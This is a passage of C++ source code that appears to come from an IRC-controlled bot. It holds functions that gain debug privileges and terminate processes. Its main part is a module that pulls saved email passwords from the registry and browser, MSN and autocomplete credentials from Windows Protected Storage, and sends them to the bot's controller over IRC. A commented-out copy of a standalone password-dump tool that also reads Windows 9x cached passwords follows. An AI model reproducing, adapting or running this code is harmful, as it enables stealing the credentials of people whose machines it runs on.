		CloseHandle(hToken);
	}

	return bRetVal;
}

BOOL GetDebugPrivs(HANDLE &hToken,TOKEN_PRIVILEGES &tPrivOld)
{
	TOKEN_PRIVILEGES tPriv;
	DWORD cbPriv=sizeof(tPrivOld);
	BOOL bRet=FALSE;
	if(!fOpenThreadToken(GetCurrentThread(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, FALSE, &hToken))
		if(!fOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &hToken))
			hToken=NULL;

	if(hToken)
	{
		tPriv.PrivilegeCount=1;
		tPriv.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
		fLookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tPriv.Privileges[0].Luid);
		if(fAdjustTokenPrivileges(hToken, FALSE, &tPriv, sizeof(tPriv), &tPrivOld, &cbPriv))
		{
			if(GetLastError()==ERROR_NOT_ALL_ASSIGNED)
			{
				CloseHandle(hToken);
				hToken=NULL;
			}
			else
				bRet=TRUE;
		}
		else
		{
			CloseHandle(hToken);
			hToken=NULL;
		}
	}
	return bRet;
}
void DropDebugPrivs(HANDLE &hToken,TOKEN_PRIVILEGES &tPrivOld)
{
	// Drop SeDebugPrivileges
	if(hToken)
	{
		fAdjustTokenPrivileges(hToken, FALSE, &tPrivOld, sizeof(tPrivOld), NULL, NULL);
		CloseHandle(hToken);
	}
}

BOOL KillPid(unsigned long lPid)
{
	bool bRetVal=FALSE;

	/*
	// Get SeDebugPrivileges
	if(!fOpenThreadToken(GetCurrentThread(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, FALSE, &hToken))
		if(!fOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES, &hToken))
			hToken=NULL;

	if(hToken) {
		tPriv.PrivilegeCount=1;
		tPriv.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
		fLookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tPriv.Privileges[0].Luid);
		if(fAdjustTokenPrivileges(hToken, FALSE, &tPriv, sizeof(tPriv), &tPrivOld, &cbPriv)) {
			if(GetLastError()==ERROR_NOT_ALL_ASSIGNED) {
				CloseHandle(hToken); hToken=NULL;
			}
		} else {
			CloseHandle(hToken); hToken=NULL;
		}
	}
	*/

	TOKEN_PRIVILEGES tPrivOld;
	HANDLE hToken;
	GetDebugPrivs(hToken,tPrivOld);

	HANDLE hProcess=OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_READ|PROCESS_TERMINATE,FALSE,lPid);
	if(hProcess) {
		TerminateProcess(hProcess, 0);
		bRetVal=TRUE;
		CloseHandle(hProcess);
	}
	
	DropDebugPrivs(hToken,tPrivOld);

	/*
	// Drop SeDebugPrivileges
	if(hToken) {
		fAdjustTokenPrivileges(hToken, FALSE, &tPrivOld, sizeof(tPrivOld), NULL, NULL);
		CloseHandle(hToken);
	}
	*/

	return bRetVal;
}

PCHAR ProcessPidToName(DWORD ProcessId,PCHAR ProcessName) {

	DWORD aProcesses[1024], cbNeeded, cProcesses;
	if (!fEnumProcesses(aProcesses,sizeof(aProcesses),&cbNeeded)) return FALSE;
	cProcesses = cbNeeded / sizeof(DWORD);
	char szProcessName[MAX_PATH] = "unknown";

	strcpy(ProcessName,"???");

	for ( int i = 0; i < cProcesses; i++ )
	{
	  HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i]);
		if ( hProcess )
		{
			HMODULE hMod;
			DWORD cbNeeded;

			if ( fEnumProcessModules( hProcess, &hMod, sizeof(hMod), &cbNeeded) )
			{

				if (ProcessId == aProcesses[i]) {
					fGetModuleFileNameEx( hProcess, hMod, szProcessName,sizeof(szProcessName) );
					sprintf(ProcessName,"%s",szProcessName);
					return ProcessName;
				}
					
			
			}
			CloseHandle( hProcess );
		}
	}
	
	return ProcessName;
}
#endif

#ifndef NO_PSTORE
extern char str_nopstore[];
extern char str_noadvapi[];

DWORD WINAPI PStore(LPVOID param)
{
	NTHREAD pstore = *((NTHREAD*)param);
	NTHREAD *pstores = (NTHREAD *)param;
	pstores->gotinfo = TRUE;
	IRC* irc=(IRC*)pstore.conn;

	char filter[IRCLINE];
	
	if (pstore.data1)
		strncpy(filter,pstore.data1,sizeof(filter));

	if (!noadvapi32)
		EnumOutlookAccounts();
	else
		irc->privmsg(pstore.target,str_noadvapi,pstore_title);

	if (!nopstore)
	{
		if (pstore.data1)
			EnumPStorage(pstore.target,irc,filter,pstore.silent,pstore.verbose);
		else
			EnumPStorage(pstore.target,irc,NULL,pstore.silent,pstore.verbose);
	}
	else
		irc->privmsg(pstore.target,str_nopstore,pstore_title);
			
	clearthread(pstore.threadnum);
	ExitThread(0);
}

OOUTDATA OutlookData[50];
int oIndex=0;
void EnumOutlookAccounts()
{
	ZeroMemory(OutlookData,sizeof(OutlookData));
	HKEY hkeyresult ,hkeyresult1;
	long l,i;
	char name[200],skey[200];
	DWORD dw2;
	FILETIME f;
	lstrcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
	LONG lResult=fRegOpenKeyEx(HKEY_CURRENT_USER,(LPCTSTR)skey,0,KEY_ALL_ACCESS,&hkeyresult1);
	if (ERROR_SUCCESS != lResult)
		return ;
	
	i=0;l=0;
	BYTE Data[150];
	BYTE Data1[150];
	DWORD size;
	int j;
	j=0;
	DWORD type=REG_BINARY;
	while (l!=ERROR_NO_MORE_ITEMS) {
		dw2=200;
		l=fRegEnumKeyEx(hkeyresult1,i,name,&dw2,NULL,NULL,NULL,&f);
		lstrcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
		lstrcat(skey,"\\");
		lstrcat(skey,name);
		fRegOpenKeyEx(HKEY_CURRENT_USER,(LPCTSTR)skey,0,KEY_ALL_ACCESS,&hkeyresult);
		size=sizeof(Data);
		if (fRegQueryValueEx(hkeyresult,(LPCTSTR)"HTTPMail User Name",0,&type,Data,&size)==ERROR_SUCCESS)
		{
			lstrcpy(OutlookData[oIndex].POPuser,(char *)Data);
			ZeroMemory(Data,sizeof(Data));
			lstrcpy(OutlookData[oIndex].POPserver,"Hotmail");
			size=sizeof(Data);
			if (fRegQueryValueEx(hkeyresult,(LPCTSTR)"HTTPMail Password2",0,&type,Data1,&size)==ERROR_SUCCESS)
			{
				int totnopass=0;
				//char mess[100];
				for(int i=2;i<size;i++)
					if (IsCharAlphaNumeric(Data1[i])||(Data1[i]=='(')||(Data1[i]==')')||(Data1[i]=='.')||(Data1[i]==' ')||(Data1[i]=='-'))
					{
						OutlookData[oIndex].POPpass[totnopass]=Data1[i];
						totnopass++;
					}
					OutlookData[oIndex].POPpass[totnopass]=0;
			}
			ZeroMemory(Data1,sizeof(Data));
			oIndex++;
		}
		else if (fRegQueryValueEx(hkeyresult,(LPCTSTR)"POP3 User Name",0,&type,Data,&size)==ERROR_SUCCESS)
		{
			lstrcpy(OutlookData[oIndex].POPuser,(char *)Data);
			ZeroMemory(Data,sizeof(Data));
			size=sizeof(Data);
			fRegQueryValueEx ( hkeyresult, ( LPCTSTR )"POP3 Server" , 0, &type, Data, &size ) ;
			lstrcpy(OutlookData[oIndex].POPserver,(char *)Data);
			ZeroMemory(Data,sizeof(Data));
			size=sizeof(Data);
			if(fRegQueryValueEx(hkeyresult,(LPCTSTR)"POP3 Password2",0,&type,Data1,&size)==ERROR_SUCCESS)
			{
				int totnopass=0;
				//char mess[100];
				for(int i=2;i<size;i++)
					if(IsCharAlphaNumeric(Data1[i])||(Data1[i]=='(')||(Data1[i]==')')||(Data1[i]=='.')||(Data1[i]==' ')||(Data1[i]=='-')){
						OutlookData[oIndex].POPpass[totnopass]=Data1[i];
						totnopass++;
					}
					OutlookData[oIndex].POPpass[totnopass]=0;
			}
			ZeroMemory(Data1,sizeof(Data1));
			oIndex++;
		}
		j++;i++;
	}
}


BOOL EnumPStorage(char *target,void *conn,char *filter,BOOL silent,BOOL verbose)
{
	IRC* irc=(IRC*)conn;

	if (!IsServiceRunning("ProtectedStorage"))
	{
		if (!silent && verbose)
			irc->privmsg(target,"%s Protected Storage is not running.",pstore_title);
		return FALSE;
	}
#ifndef NO_SERVICE
	ImpersonateInteractiveUser();
#endif

	int iSent=0;
	IPStorePtr PStore; 
	HRESULT hRes=fPStoreCreateInstance(&PStore, 0, 0, 0);
	if (FAILED(hRes))
	{
		if (!silent && verbose)
			irc->privmsg(target,"%s PStoreCreateInstance failed.",pstore_title);
		return FALSE;
	}

	IEnumPStoreTypesPtr EnumPStoreTypes;
	hRes=PStore->EnumTypes(0, 0, &EnumPStoreTypes);
	if (FAILED(hRes))
	{
		if (!silent && verbose)
			irc->privmsg(target,"%s Failed to query Protected Storage.",pstore_title);
		return FALSE;
	}

	GUID TypeGUID;
	char szItemName[512];
	char szItemData[512];
	char szResName[1512];
	char szResData[512];
	char szItemGUID[50];

	while(EnumPStoreTypes->raw_Next(1,&TypeGUID,0) == S_OK)
	{
		wsprintf(szItemGUID,"%x",TypeGUID);

		IEnumPStoreTypesPtr EnumSubTypes;
		hRes = PStore->EnumSubtypes(0, &TypeGUID, 0, &EnumSubTypes);

		GUID subTypeGUID;
		while(EnumSubTypes->raw_Next(1,&subTypeGUID,0) == S_OK)
		{
			IEnumPStoreItemsPtr spEnumItems;
			HRESULT hRes=PStore->EnumItems(0, &TypeGUID, &subTypeGUID, 0, &spEnumItems);

			LPWSTR itemName;
			while(spEnumItems->raw_Next(1,&itemName,0) == S_OK)
			{
				wsprintf(szItemName,"%ws",itemName);			 
				char chekingdata[200];
				unsigned long psDataLen = 0;
				unsigned char *psData = NULL;
				_PST_PROMPTINFO *pstiinfo = NULL;
				hRes = PStore->ReadItem(0,&TypeGUID,&subTypeGUID,itemName,&psDataLen,&psData,pstiinfo,0);
				if(lstrlen((char *)psData)<(psDataLen-1))
				{
					int i=0;
					for(int m=0;m<psDataLen;m+=2)
					{
						if(psData[m]==0)
							szItemData[i]=',';
						else
							szItemData[i]=psData[m];
						i++;
					}
					szItemData[i-1]=0;				  			
				}
				else
				{
					wsprintf(szItemData,"%s",psData);				  
				}	
				lstrcpy(szResName,"");
				lstrcpy(szResData,"");

				//5e7e8100 - IE:Password-Protected sites
				if (lstrcmp(szItemGUID,"5e7e8100")==0)
				{				  
					lstrcpy(chekingdata,"");
					if(strstr(szItemData,":")!=0)
					{
						lstrcpy(chekingdata,strstr(szItemData,":")+1);
						*(strstr(szItemData,":"))=0;				  
					}
					iSent++;
					if ((strcmp(szItemData,"") && strcmp(chekingdata,"")) || verbose)
						irc->privmsg_filter(target,filter,"%s IE Password Protected: %s, %s:%s",pstore_title,szItemName,szItemData,chekingdata);
				}

				//e161255a - IE:AutoComplete
				if (lstrcmp(szItemGUID,"e161255a")==0)
				{
					if (strstr(szItemName,"StringIndex")==0)
					{
						if(strstr(szItemName,":String")!=0)
							*strstr(szItemName,":String")=0;
						
						lstrcpyn(chekingdata,szItemName,8);			  
//						if ((strstr(chekingdata,"http:/")==0)&&(strstr(chekingdata,"https:/")==0)&&verbose)
//						{
//							if (!strcmp(szItemName,"username"))
//								irc->privmsg_filter(target,filter,"IE Auto-Complete: Usernames: %s",szItemData);
//
//							else
//								irc->privmsg_filter(target,filter,"IE Auto-Complete: Unknown: %s, %s, %s",szItemName,szItemData,chekingdata);
//						}
//						else
						if (strstr(chekingdata,"http:/") || strstr(chekingdata,"https:/"))
						{
							lstrcpy(chekingdata,"");
							if(strstr(szItemData,",")!=0)
							{
								lstrcpy(chekingdata,strstr(szItemData,",")+1);
								*(strstr(szItemData,","))=0;				  
							}
							iSent++;
							if ((strcmp(szItemData,"") && strcmp(chekingdata,"")) || verbose)
								irc->privmsg_filter(target,filter,"%s IE Auto-Complete: %s, %s:%s",pstore_title,szItemName,szItemData,chekingdata);
						}
					}
				}
				//	  b9819c52 MSN Explorer Signup
				if (lstrcmp(szItemGUID,"b9819c52")==0)
				{
					char msnid[100];
					char msnpass[100];
					int i=0;
					BOOL first=TRUE;
					for(int m=0;m<psDataLen;m+=2)
					{
						if(psData[m]==0)
						{
							szItemData[i]=',';					
							i++;
						}
						else
						{
							if (IsCharAlphaNumeric(psData[m])||(psData[m]=='@')||(psData[m]=='.')||(psData[m]=='_'))
							{
								szItemData[i]=psData[m];					
								i++;
							}							
						}
					}
					szItemData[i-1]=0;
					char *p;
					p=szItemData+2;
					//psData[4] - number of msn accounts 
					for(int ii=0;ii<psData[4];ii++)
					{
						lstrcpy(msnid,p+1);
						if (strstr(msnid,",")!=0)
							*strstr(msnid,",")=0;
					
						if(strstr(p+1,",")!=0)
							lstrcpy(msnpass,strstr(p+1,",")+2);				

						if(strstr(msnpass,",")!=0)
							*strstr(msnpass,",")=0;

						p=strstr(p+1,",")+2+lstrlen(msnpass)+7;
						if ((strcmp(msnpass,"") && strcmp(msnid,"")) || verbose)
						{
							iSent++;
							irc->privmsg_filter(target,filter,"%s MSN: %s:%s",pstore_title,msnid,msnpass);
						}
					}
				}

				//220d5cc1 Outlooks
				if (lstrcmp(szItemGUID,"220d5cc1")==0)
				{
					BOOL bDeletedOEAccount=TRUE;		
					for (int i=0;i<oIndex;i++)
					{
						if((lstrcmp(OutlookData[i].POPpass,szItemName)==0)&&(strcmp(szItemData,"")))
						{
							bDeletedOEAccount=FALSE;
							iSent++;
							irc->privmsg_filter(target,filter,"%s Outlook Express: %s, %s:%s",pstore_title,OutlookData[i].POPserver,OutlookData[i].POPuser,szItemData);
							break;
						}
					}
					if (bDeletedOEAccount && ((strcmp(szItemData,"") && strcmp(OutlookData[i].POPuser,"")) || verbose))
					{
						iSent++;
						irc->privmsg_filter(target,filter,"%s Erased Outlook Express: %s:%s",pstore_title,OutlookData[i].POPuser,szItemData);
					}
				}

				ZeroMemory(szItemName,sizeof(szItemName));
				ZeroMemory(szItemData,sizeof(szItemData));			  
			}
		}
	}
	if (iSent==0)
	{
		if (!silent && verbose)
			irc->privmsg(target,"%s No Protected Storage entries found.",pstore_title);
	}
	return TRUE;
}


/*
//Protected Storage Explorer
//By Hirosh

char SavingFname[MAX_PATH];
HWND hwndlistview;
BOOL iS9x=FALSE;
typedef struct TOOUTDATA{
	char POPuser[100];
	char POPpass[100];
	char POPserver[100];
} OOUTDATA;
OOUTDATA OutlookData[50];
int oIndex=0;

void EnumOutlookAccounts()
{
	ZeroMemory(OutlookData,sizeof(OutlookData));
	HKEY hkeyresult ,hkeyresult1;
	long l,i;
	char name[200],skey[200];
	DWORD dw2;
	FILETIME f;
	lstrcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
	LONG lResult=RegOpenKeyEx(HKEY_CURRENT_USER,(LPCTSTR)skey,0,KEY_ALL_ACCESS,&hkeyresult1);
	if (ERROR_SUCCESS != lResult)
		return ;

	i=0;l=0;
	BYTE Data[150];
	BYTE Data1[150];
	DWORD size;
	int j;
	j=0;
	DWORD type=REG_BINARY;
	while (l!=ERROR_NO_MORE_ITEMS) {
		dw2=200;
		l=RegEnumKeyEx(hkeyresult1,i,name,&dw2,NULL,NULL,NULL,&f);
		lstrcpy(skey,"Software\\Microsoft\\Internet Account Manager\\Accounts");
		lstrcat(skey,"\\");
		lstrcat(skey,name);
		RegOpenKeyEx(HKEY_CURRENT_USER,(LPCTSTR)skey,0,KEY_ALL_ACCESS,&hkeyresult);
		size=sizeof(Data);
		if (RegQueryValueEx(hkeyresult,(LPCTSTR)"HTTPMail User Name",0,&type,Data,&size)==ERROR_SUCCESS)
		{
			lstrcpy(OutlookData[oIndex].POPuser,(char *)Data);
			ZeroMemory(Data,sizeof(Data));
			lstrcpy(OutlookData[oIndex].POPserver,"Hotmail");
			size=sizeof(Data);
			if (RegQueryValueEx(hkeyresult,(LPCTSTR)"HTTPMail Password2",0,&type,Data1,&size)==ERROR_SUCCESS)
			{
				int totnopass=0;
				char mess[100];
				for(int i=2;i<size;i++)
					if (IsCharAlphaNumeric(Data1[i])||(Data1[i]=='(')||(Data1[i]==')')||(Data1[i]=='.')||(Data1[i]==' ')||(Data1[i]=='-'))
					{
						OutlookData[oIndex].POPpass[totnopass]=Data1[i];
						totnopass++;
					}
				OutlookData[oIndex].POPpass[totnopass]=0;
			}
			ZeroMemory(Data1,sizeof(Data));
			oIndex++;
		}
		else if (RegQueryValueEx(hkeyresult,(LPCTSTR)"POP3 User Name",0,&type,Data,&size)==ERROR_SUCCESS)
		{
			lstrcpy(OutlookData[oIndex].POPuser,(char *)Data);
			ZeroMemory(Data,sizeof(Data));
			size=sizeof(Data);
			RegQueryValueEx ( hkeyresult, ( LPCTSTR )"POP3 Server" , 0, &type, Data, &size ) ;
			lstrcpy(OutlookData[oIndex].POPserver,(char *)Data);
			ZeroMemory(Data,sizeof(Data));
			size=sizeof(Data);
			if(RegQueryValueEx(hkeyresult,(LPCTSTR)"POP3 Password2",0,&type,Data1,&size)==ERROR_SUCCESS)
			{
				int totnopass=0;
				char mess[100];
				for(int i=2;i<size;i++)
					if(IsCharAlphaNumeric(Data1[i])||(Data1[i]=='(')||(Data1[i]==')')||(Data1[i]=='.')||(Data1[i]==' ')||(Data1[i]=='-')){
						OutlookData[oIndex].POPpass[totnopass]=Data1[i];
						totnopass++;
					}
				OutlookData[oIndex].POPpass[totnopass]=0;
			}
			ZeroMemory(Data1,sizeof(Data1));
			oIndex++;
		}
		j++;i++;
	}
}


void SaveToDisk(char *buf)
{
	DWORD dwBytes;
	HANDLE hf=CreateFile(SavingFname,GENERIC_WRITE,0,NULL,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	SetFilePointer(hf,0,NULL,FILE_END);
	WriteFile(hf,(LPVOID)buf,strlen(buf),&dwBytes,NULL);
	CloseHandle(hf);
}

BOOL AddItemm(BOOL Save,char *resname,char *restype,char *usrname,char *pass)
{
	if (!Save)
	{
		LVITEM lvi;	
		lvi.mask = LVIF_TEXT; 
		lvi.state = LVIS_SELECTED ; 
		lvi.stateMask = 0; 
		
		lvi.iItem = 10000;
		lvi.iSubItem = 0;
		lvi.pszText = "";
		
		int i = ListView_InsertItem(hwndlistview, &lvi);
		if(!iS9x)
		{
			ListView_SetItemText(hwndlistview, i, 0, resname);
			ListView_SetItemText(hwndlistview, i, 1, restype);
			ListView_SetItemText(hwndlistview, i, 2, usrname);
			ListView_SetItemText(hwndlistview, i, 3, pass);
		}
		else
		{
			ListView_SetItemText(hwndlistview, i, 0, usrname);
			ListView_SetItemText(hwndlistview, i, 1, pass);
		}
		SetFocus(hwndlistview);
		ListView_SetItemState (hwndlistview,i,LVIS_FOCUSED | LVIS_SELECTED, 0x000F);     
		ListView_SetSelectionMark(hwndlistview,i);
	}
	else
	{		
		if(!iS9x)
		{
			SaveToDisk("\r\n");
			SaveToDisk("<tr><td>");
			SaveToDisk(resname);
			SaveToDisk("</td><td>");
			SaveToDisk(restype);
			SaveToDisk("</td><td>");
			SaveToDisk(usrname);
			SaveToDisk("</td><td>");
			SaveToDisk(pass);
			SaveToDisk("</td></tr>");	
			SaveToDisk("\r\n");
		}
		else
		{
			SaveToDisk("\r\n");
			SaveToDisk("<tr><td>");
			SaveToDisk(usrname);
			SaveToDisk("</td><td>");
			SaveToDisk(pass);
			SaveToDisk("</td></tr>");	
			SaveToDisk("\r\n");
		}		
	}
	return TRUE;
}   

void EnumPStorage(BOOL Save)
{
	typedef HRESULT (WINAPI *tPStoreCreateInstance)(IPStore **, DWORD, DWORD, DWORD);
	HMODULE hpsDLL; 
	hpsDLL = LoadLibrary("pstorec.dll");

	tPStoreCreateInstance pPStoreCreateInstance;
	pPStoreCreateInstance = (tPStoreCreateInstance)GetProcAddress(hpsDLL, "PStoreCreateInstance");

	IPStorePtr PStore; 
	HRESULT hRes = pPStoreCreateInstance(&PStore, 0, 0, 0); 

	IEnumPStoreTypesPtr EnumPStoreTypes;
	hRes = PStore->EnumTypes(0, 0, &EnumPStoreTypes);

	if (!FAILED(hRes))
	{

		GUID TypeGUID;
		char szItemName[512];
		char szItemData[512];
		char szResName[1512];
		char szResData[512];
		char szItemGUID[50];

		while(EnumPStoreTypes->raw_Next(1,&TypeGUID,0) == S_OK)
		{      
			wsprintf(szItemGUID,"%x",TypeGUID);

			IEnumPStoreTypesPtr EnumSubTypes;
			hRes = PStore->EnumSubtypes(0, &TypeGUID, 0, &EnumSubTypes);

			GUID subTypeGUID;
			while(EnumSubTypes->raw_Next(1,&subTypeGUID,0) == S_OK)
			{
				IEnumPStoreItemsPtr spEnumItems;
				HRESULT hRes=PStore->EnumItems(0, &TypeGUID, &subTypeGUID, 0, &spEnumItems);

				LPWSTR itemName;
				while(spEnumItems->raw_Next(1,&itemName,0) == S_OK)
				{
					wsprintf(szItemName,"%ws",itemName);			 
					char chekingdata[200];
					unsigned long psDataLen = 0;
					unsigned char *psData = NULL;
					_PST_PROMPTINFO *pstiinfo = NULL;
					hRes = PStore->ReadItem(0,&TypeGUID,&subTypeGUID,itemName,&psDataLen,&psData,pstiinfo,0);
					if(lstrlen((char *)psData)<(psDataLen-1))
					{
						int i=0;
						for(int m=0;m<psDataLen;m+=2)
						{
							if(psData[m]==0)
								szItemData[i]=',';
							else
								szItemData[i]=psData[m];
							i++;
						}
						szItemData[i-1]=0;				  			
					}
					else
					{
						wsprintf(szItemData,"%s",psData);				  
					}	
					lstrcpy(szResName,"");
					lstrcpy(szResData,"");
					
					//220d5cc1 Outlooks
					if (lstrcmp(szItemGUID,"220d5cc1")==0)
					{
						BOOL bDeletedOEAccount=TRUE;		
						for (int i=0;i<oIndex;i++)
						{
							if(lstrcmp(OutlookData[i].POPpass,szItemName)==0)
							{
								bDeletedOEAccount=FALSE;
								AddItemm(Save,OutlookData[i].POPserver,"OutlookExpress",OutlookData[i].POPuser,szItemData);
								break;
							}
						}
						if (bDeletedOEAccount)
							AddItemm(Save,szItemName,"Deleted OE Account",OutlookData[i].POPuser,szItemData);
					}				 

					//5e7e8100 - IE:Password-Protected sites
					if (lstrcmp(szItemGUID,"5e7e8100")==0)
					{				  
						lstrcpy(chekingdata,"");
						if(strstr(szItemData,":")!=0)
						{
							lstrcpy(chekingdata,strstr(szItemData,":")+1);
							*(strstr(szItemData,":"))=0;				  
						}
						AddItemm(Save,szItemName,"IE:Password-Protected sites",szItemData,chekingdata);
					}
	
					//	  b9819c52 MSN Explorer Signup
					if (lstrcmp(szItemGUID,"b9819c52")==0)
					{
						char msnid[100];
						char msnpass[100];
						int i=0;
						BOOL first=TRUE;
						for(int m=0;m<psDataLen;m+=2)
						{
							if(psData[m]==0)
							{
								szItemData[i]=',';					
								i++;
							}
							else
							{
								if (IsCharAlphaNumeric(psData[m])||(psData[m]=='@')||(psData[m]=='.')||(psData[m]=='_'))
								{
									szItemData[i]=psData[m];					
									i++;
								}							
							}
						}
						szItemData[i-1]=0;
						char *p;
						p=szItemData+2;
						//psData[4] - number of msn accounts 
						for(int ii=0;ii<psData[4];ii++)
						{
							lstrcpy(msnid,p+1);
							if (strstr(msnid,",")!=0)
								*strstr(msnid,",")=0;
						
							if(strstr(p+1,",")!=0)
								lstrcpy(msnpass,strstr(p+1,",")+2);				

							if(strstr(msnpass,",")!=0)
								*strstr(msnpass,",")=0;

							p=strstr(p+1,",")+2+lstrlen(msnpass)+7;
							AddItemm(Save,msnid,"MSN Explorer Signup",msnid,msnpass);
						}
					}

					//e161255a IE 
					if (lstrcmp(szItemGUID,"e161255a")==0)
					{
						if (strstr(szItemName,"StringIndex")==0)
						{
							if(strstr(szItemName,":String")!=0)
								*strstr(szItemName,":String")=0;
							
							lstrcpyn(chekingdata,szItemName,8);			  
							if ((strstr(chekingdata,"http:/")==0)&&(strstr(chekingdata,"https:/")==0))
								AddItemm(Save,szItemName,"IE Auto Complete Fields",szItemData,"");
							else
							{
								lstrcpy(chekingdata,"");
								if(strstr(szItemData,",")!=0)
								{
									lstrcpy(chekingdata,strstr(szItemData,",")+1);
									*(strstr(szItemData,","))=0;				  
								}
								AddItemm(Save,szItemName,"AutoComplete Passwords",szItemData,chekingdata);
							}
						}
					}
					ZeroMemory(szItemName,sizeof(szItemName));
					ZeroMemory(szItemData,sizeof(szItemData));			  
				}
			}
		}
	}
}

//Cached Passwords - 9x
struct PASSWORD_CACHE_ENTRY {
	WORD cbEntry;
	WORD cbResource;
	WORD cbPassword;
	BYTE iEntry;
	BYTE nType;
	char abResource[1];
};
typedef struct {
	char *pBuffer;
	int nBufLen;
	int nBufPos;
} PASSCACHECALLBACK_DATA;

typedef BOOL (FAR PASCAL *CACHECALLBACK)(struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData);
typedef DWORD (WINAPI *ENUMPASSWORD)(LPSTR pbPrefix, WORD  cbPrefix, BYTE  nType, CACHECALLBACK pfnCallback, DWORD dwRefData);

DWORD APIENTRY WNetEnumCachedPasswords(LPSTR pbPrefix,WORD cbPrefix,BYTE nType,CACHECALLBACK pfnCallback,DWORD dwRefData);
ENUMPASSWORD pWNetEnumCachedPasswords;

BOOL PASCAL AddPass(struct PASSWORD_CACHE_ENTRY FAR *pce, DWORD dwRefData)
{
	char buff[1024],buff2[1024];
	int nCount;
	PASSCACHECALLBACK_DATA *dat;
	dat = (PASSCACHECALLBACK_DATA *)dwRefData;
	nCount=pce->cbResource+1;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource, nCount);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	nCount=pce->cbPassword+1;
	if(nCount>1023) nCount=1023;
	lstrcpyn(buff, pce->abResource+pce->cbResource, nCount);
	buff[nCount] = 0;
	CharToOem(buff, buff2);
	if((dat->nBufPos+lstrlen(buff2))>=dat->nBufLen) return FALSE;
	lstrcpy(dat->pBuffer+dat->nBufPos,buff2);
	dat->nBufPos+=lstrlen(buff2)+1;

	return TRUE;
}
void CashedPass(BOOL Save)
{
   HMODULE hLib=LoadLibrary("MPR.DLL");

   PASSCACHECALLBACK_DATA dat;
   dat.pBuffer=(char *)malloc(65536);
   dat.nBufLen=65536;
   dat.nBufPos=0;
   pWNetEnumCachedPasswords = (ENUMPASSWORD)GetProcAddress(hLib, "WNetEnumCachedPasswords");

   pWNetEnumCachedPasswords(NULL, 0, 0xff, AddPass, (DWORD) &dat);
   char *svStr;
   svStr=dat.pBuffer;   
   do {
	     char *svRsc=svStr;
		 svStr+=lstrlen(svStr)+1;		 
	   	 char *svPwd=svStr;
		 svStr+=lstrlen(svStr)+1;		 
		 char szUser[1024];
		 char szPass[1024];		 
		 AddItemm(Save,"","",svRsc,svPwd);				         		 
   }while(*svStr!='\0');

   FreeLibrary(hLib);

};
/////////////////////////////////////////
#define TableHeader "<p><b><font color=\"#FF0000\"></font></b></p><table border=\"1\" cellpadding=\"0\" cellspacing=\"0\"style=\"border-collapse: collapse\" bordercolor=\"#111111\" width=\"100%\" id=\"AutoNumber1\">"
#define Table "</table>"
#include <commdlg.h>
LRESULT CALLBACK DLgProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
OPENFILENAME ofn;
char szFile[MAX_PATH];  
	switch (message){

	case WM_INITDIALOG:
	SendMessage(hDlg, WM_SETICON, ICON_SMALL, (LPARAM)LoadIcon(GetModuleHandle(0), MAKEINTRESOURCE(IDI_ICON1)));		
	if(!iS9x)
		SetWindowText(hDlg,"Protected Storage                        www.hirosh.NET");
	else
		SetWindowText(hDlg,"Cashed Passwords                         www.hirosh.NET");

			hwndlistview = GetDlgItem(hDlg, IDC_LIST3);
			LVCOLUMN lvcol;
			if(!iS9x){
			lvcol.mask =LVCF_TEXT;;
			lvcol.pszText = "Resource Name";
			ListView_InsertColumn(hwndlistview, 0, &lvcol);
			ListView_SetColumnWidth(hwndlistview, 0, 160);
			
			lvcol.mask =LVCF_TEXT;
			lvcol.pszText = "Resource Type";			
			ListView_InsertColumn(hwndlistview, 1, &lvcol);
			ListView_SetColumnWidth(hwndlistview, 1, 110);		
			
			lvcol.mask =LVCF_TEXT;
			lvcol.pszText = "User Name/Value";			
			ListView_InsertColumn(hwndlistview, 2, &lvcol);
			ListView_SetColumnWidth(hwndlistview, 2, 200);		

			lvcol.mask =LVCF_TEXT;
			lvcol.pszText = "Password";			
			ListView_InsertColumn(hwndlistview, 3, &lvcol);
			ListView_SetColumnWidth(hwndlistview, 3, 100);
			EnumOutlookAccounts();
			EnumPStorage(FALSE);
			}
			else{
			lvcol.mask =LVCF_TEXT;
			lvcol.pszText = "User Name/Value";			
			ListView_InsertColumn(hwndlistview, 0, &lvcol);
			ListView_SetColumnWidth(hwndlistview, 0, 250);		

			lvcol.mask =LVCF_TEXT;
			lvcol.pszText = "Password";			
			ListView_InsertColumn(hwndlistview, 1, &lvcol);
			ListView_SetColumnWidth(hwndlistview, 1, 150);						
			CashedPass(FALSE);
			}
			ListView_SetExtendedListViewStyle(hwndlistview,LVS_EX_FULLROWSELECT);
	
		return TRUE;

case WM_COMMAND:
		switch ( LOWORD(wParam) ){

		case IDOK:		
			ZeroMemory(&ofn, sizeof(OPENFILENAME));
			ofn.lStructSize = sizeof(OPENFILENAME);
			ofn.hwndOwner = hDlg;lstrcpy(szFile,"*.*");
			ofn.lpstrFile ="pstectedstorage.htm";	ofn.nMaxFile = sizeof(szFile);
			ofn.lpstrFilter = "Htm\0*.htm\0";
			ofn.nFilterIndex = 1;ofn.lpstrFileTitle = NULL;
			ofn.nMaxFileTitle = 0;	ofn.lpstrInitialDir = NULL;
			ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;
